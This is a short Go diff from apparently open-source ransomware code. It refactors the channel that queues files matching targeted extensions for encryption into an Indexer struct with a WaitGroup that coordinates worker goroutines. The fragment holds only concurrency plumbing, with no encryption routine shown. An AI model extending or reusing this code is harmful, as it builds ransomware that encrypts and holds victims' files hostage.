@@ -5,6 +5,7 @@ import (
 	"log"
 	"os"
 	"runtime"
+	"sync"
 
 	"github.com/mauri870/ransomware/cryptofs"
 )
@@ -51,8 +52,13 @@ var (
 		"cfg", "ini", "prf",
 	}
 
-	// Files to encrypt that match the interesting extensions
-	MatchedFiles = make(chan *cryptofs.File)
+	// Indexer index files and control goroutines execution
+	Indexer = struct {
+		Files chan *cryptofs.File
+		sync.WaitGroup
+	}{
+		Files: make(chan *cryptofs.File),
+	}
 
 	// Workers processing the files
 	NumWorkers = 2
